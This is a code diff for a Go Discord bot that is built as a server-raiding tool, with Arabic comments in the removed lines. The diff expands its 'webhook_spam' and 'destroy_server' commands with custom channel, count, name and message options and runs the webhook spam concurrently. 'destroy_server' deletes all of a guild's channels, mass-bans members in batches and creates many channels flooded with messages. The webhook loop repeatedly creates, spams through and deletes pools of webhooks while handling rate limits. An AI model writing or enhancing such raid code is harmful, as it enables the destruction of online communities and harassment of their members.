@@ -30,7 +30,6 @@ type Webhook struct {
 	URL string
 }
 
-// دالة عامة للتعامل مع أخطاء 429 (Rate Limit) حسب استجابة ديسكورد
 func handleRateLimit(resp *http.Response) bool {
 	if resp.StatusCode == 429 {
 		retryAfterStr := resp.Header.Get("Retry-After")
@@ -67,26 +66,74 @@ func main() {
 			return
 		}
 
-		switch i.ApplicationCommandData().Name {
+		data := i.ApplicationCommandData()
+		optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
+		for _, opt := range data.Options {
+			optionMap[opt.Name] = opt
+		}
+
+		switch data.Name {
 		case "webhook_spam":
+			channelID := i.ChannelID
+			if chOpt, ok := optionMap["channel"]; ok {
+				channelID = chOpt.ChannelValue(s).ID
+			}
+			
+			messageContent := "Spam Message"
+			if msgOpt, ok := optionMap["message"]; ok {
+				messageContent = msgOpt.StringValue()
+			}
+
+			totalMessages := 50
+			if countOpt, ok := optionMap["count"]; ok {
+				totalMessages = int(countOpt.IntValue())
+			}
+
+			baseName := "spam-wh"
+			if nameOpt, ok := optionMap["name"]; ok {
+				baseName = nameOpt.StringValue()
+			}
+
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "Starting webhook pool loop...",
+					Content: fmt.Sprintf("Starting webhook spam loop for %d messages...", totalMessages),
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
-			go runWebhookLoop(token, i.ChannelID, "spam-wh", "Spam Message", 50, 10, 3*time.Second)
+
+			go runWebhookLoop(token, channelID, baseName, messageContent, totalMessages)
 
 		case "destroy_server":
+			roomNamePrefix := "raid-room"
+			if nameOpt, ok := optionMap["room_name"]; ok {
+				roomNamePrefix = nameOpt.StringValue()
+			}
+
+			roomCount := 20
+			if countOpt, ok := optionMap["room_count"]; ok {
+				roomCount = int(countOpt.IntValue())
+			}
+
+			msgCount := 5
+			if msgCntOpt, ok := optionMap["msg_count"]; ok {
+				msgCount = int(msgCntOpt.IntValue())
+			}
+
+			messageContent := "Default raid message"
+			if msgOpt, ok := optionMap["message"]; ok {
+				messageContent = msgOpt.StringValue()
+			}
+
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "Executing precise interval workflow...",
+					Content: "Executing precise server workflow (Auto-Delete, 50-batch bans, Custom Rooms, 20ms msgs)...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
-			go runPreciseWorkflow(s, i.GuildID, "Message from bot")
+
+			go runPreciseWorkflow(s, i.GuildID, roomNamePrefix, roomCount, msgCount, messageContent)
 		}
 	})
 
@@ -99,11 +146,63 @@ func main() {
 	commands := []*discordgo.ApplicationCommand{
 		{
 			Name:        "webhook_spam",
-			Description: "Run webhook pool spam loop",
+			Description: "Webhook pool loop: creates 10, spams, waits 3s, deletes, repeats",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionChannel,
+					Name:        "channel",
+					Description: "Target channel",
+					Required:    false,
+				},
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "message",
+					Description: "Message content",
+					Required:    false,
+				},
+				{
+					Type:        discordgo.ApplicationCommandOptionInteger,
+					Name:        "count",
+					Description: "Total messages count",
+					Required:    false,
+				},
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "name",
+					Description: "Webhook base name",
+					Required:    false,
+				},
+			},
 		},
 		{
 			Name:        "destroy_server",
-			Description: "Run precise timing server workflow",
+			Description: "Precise server workflow with custom room names, counts, and auto-bans",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "room_name",
+					Description: "Custom name for new rooms",
+					Required:    false,
+				},
+				{
+					Type:        discordgo.ApplicationCommandOptionInteger,
+					Name:        "room_count",
+					Description: "Number of rooms to create",
+					Required:    false,
+				},
+				{
+					Type:        discordgo.ApplicationCommandOptionInteger,
+					Name:        "msg_count",
+					Description: "Number of messages per room",
+					Required:    false,
+				},
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "message",
+					Description: "Message content to send",
+					Required:    false,
+				},
+			},
 		},
 	}
 
@@ -119,8 +218,7 @@ func main() {
 	log.Println("Shutting down.")
 }
 
-// 1. لوب الويب هوكات (10 -> إرسال -> 3 ثواني -> حذف)
-func runWebhookLoop(token, channelID, baseName, messageContent string, totalMessages int, webhookPoolSize int, pauseDuration time.Duration) {
+func runWebhookLoop(token, channelID, baseName, messageContent string, totalMessages int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
@@ -133,7 +231,7 @@ func runWebhookLoop(token, channelID, baseName, messageContent string, totalMess
 		var mu sync.Mutex
 		var wg sync.WaitGroup
 
-		for i := 0; i < webhookPoolSize; i++ {
+		for i := 0; i < 10; i++ {
 			wg.Add(1)
 			go func(idx int) {
 				defer wg.Done()
@@ -183,42 +281,60 @@ func runWebhookLoop(token, channelID, baseName, messageContent string, totalMess
 			continue
 		}
 
+		var spamWg sync.WaitGroup
 		for _, wh := range pool {
 			if sentCount >= totalMessages {
 				break
 			}
-			b, _ := json.Marshal(map[string]string{"content": messageContent})
-			req, err := http.NewRequest("POST", wh.URL, bytes.NewBuffer(b))
-			if err == nil {
-				req.Header.Set("Content-Type", "application/json")
-				if resp, err := client.Do(req); err == nil {
-					handleRateLimit(resp)
-					resp.Body.Close()
+			spamWg.Add(1)
+			go func(targetWH Webhook) {
+				defer spamWg.Done()
+				b, _ := json.Marshal(map[string]string{"content": messageContent})
+				req, err := http.NewRequest("POST", targetWH.URL, bytes.NewBuffer(b))
+				if err != nil {
+					return
 				}
-			}
+				req.Header.Set("Content-Type", "application/json")
+
+				resp, err := client.Do(req)
+				if err != nil {
+					return
+				}
+				handleRateLimit(resp)
+				resp.Body.Close()
+			}(wh)
 			sentCount++
 		}
+		spamWg.Wait()
 
-		time.Sleep(pauseDuration)
+		time.Sleep(3 * time.Second)
 
+		var delWg sync.WaitGroup
 		for _, wh := range pool {
-			req, err := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+wh.ID, nil)
-			if err == nil {
+			delWg.Add(1)
+			go func(webhookID string) {
+				defer delWg.Done()
+				req, err := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+webhookID, nil)
+				if err != nil {
+					return
+				}
 				for k, v := range headers {
 					req.Header.Set(k, v)
 				}
-				if resp, err := client.Do(req); err == nil {
-					handleRateLimit(resp)
-					resp.Body.Close()
+
+				resp, err := client.Do(req)
+				if err != nil {
+					return
 				}
-			}
+				handleRateLimit(resp)
+				resp.Body.Close()
+			}(wh.ID)
 		}
+		delWg.Wait()
 	}
 }
 
-// 2. الأمر الثاني حسب الشروط الزمنية والدفعات بدقة
-func runPreciseWorkflow(s *discordgo.Session, guildID string, messageContent string) {
-	// أ. حذف الرومات: روم كل 30 ملي ثانية
+func runPreciseWorkflow(s *discordgo.Session, guildID string, roomNamePrefix string, roomCount int, msgCount int, messageContent string) {
 	channels, err := s.GuildChannels(guildID)
 	if err == nil {
 		for _, ch := range channels {
@@ -230,7 +346,6 @@ func runPreciseWorkflow(s *discordgo.Session, guildID string, messageContent str
 		}
 	}
 
-	// ب. تقسيم الباند إلى 50 شخص لكل دفعة، وكل شخص يقعد 100 ملي ثانية
 	members, err := s.GuildMembers(guildID, "", 1000)
 	if err == nil && len(members) > 0 {
 		var batch []string
@@ -249,16 +364,15 @@ func runPreciseWorkflow(s *discordgo.Session, guildID string, messageContent str
 		}
 	}
 
-	// ج. إنشاء الرومات ورسايل البوت:
-	for i := 0; i < 20; i++ {
+	for i := 0; i < roomCount; i++ {
 		newChannel, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
-			Name: fmt.Sprintf("room-%d", i+1),
+			Name: fmt.Sprintf("%s-%d", roomNamePrefix, i+1),
 			Type: discordgo.ChannelTypeGuildText,
 		})
 		
 		if err == nil && newChannel != nil {
 			go func(chID string) {
-				for m := 0; m < 5; m++ {
+				for m := 0; m < msgCount; m++ {
 					s.ChannelMessageSend(chID, messageContent)
 					time.Sleep(20 * time.Millisecond)
 				}
